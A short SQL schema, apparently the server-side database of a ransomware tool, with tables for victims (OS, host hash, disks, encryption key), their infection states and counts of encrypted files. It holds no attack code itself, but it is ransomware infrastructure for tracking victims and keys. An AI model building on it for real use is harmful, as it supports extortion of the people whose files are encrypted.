--drop table if exists decrypted;
--drop table if exists encrypted;
--drop table if exists states;
--drop table if exists victims;

CREATE TABLE victims (
    OS TEXT,
    hash TEXT PRIMARY KEY,
    disks TEXT,
    key TEXT
);

CREATE TABLE states (
    id_state INTEGER PRIMARY KEY AUTOINCREMENT,
    hash_victim TEXT NOT NULL,
    datetime INTEGER DEFAULT (strftime('%s', 'now')),
    state TEXT NOT NULL,
    FOREIGN KEY (hash_victim) REFERENCES victims(hash) ON DELETE CASCADE
);

CREATE TABLE encrypted (
    id_encrypted INTEGER PRIMARY KEY AUTOINCREMENT,
    hash_victim TEXT NOT NULL,
    datetime INTEGER DEFAULT (strftime('%s', 'now')),
    nb_files INTEGER,
    FOREIGN KEY (hash_victim) REFERENCES victims(hash) ON DELETE CASCADE
);


